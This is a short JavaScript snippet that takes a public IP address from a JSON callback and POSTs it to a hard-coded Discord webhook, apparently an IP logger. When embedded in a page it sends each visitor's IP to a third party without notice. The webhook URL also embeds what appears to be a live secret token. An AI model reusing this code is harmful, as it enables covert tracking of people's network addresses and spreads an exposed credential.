function getIP(json) {
    const ipAddress = json.ip;
    sendToDiscordWebhook(ipAddress);
}

function sendToDiscordWebhook(ipAddress) {
    const webhookURL = 'https://discord.com/api/webhooks/1103759823419482282/y0T-XegSrW1ACsaL5SKFPd8HRcEt-Kopjvi49ymFY6ag4P7x2DM1AZ83PbCRXtSXSk4R';
    const message = `My public IP address is: ${ipAddress}`;

    const xhr = new XMLHttpRequest();
    xhr.open('POST', webhookURL, true);
    xhr.setRequestHeader('Content-Type', 'application/json');

    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 300) {
            console.log('Message sent to Discord successfully:', xhr.responseText);
        } else {
            console.error('Error sending message to Discord:', xhr.statusText);
        }
    };

    xhr.onerror = function () {
        console.error('Network error while trying to send message to Discord.');
    };

    xhr.send(JSON.stringify({ content: message }));
}
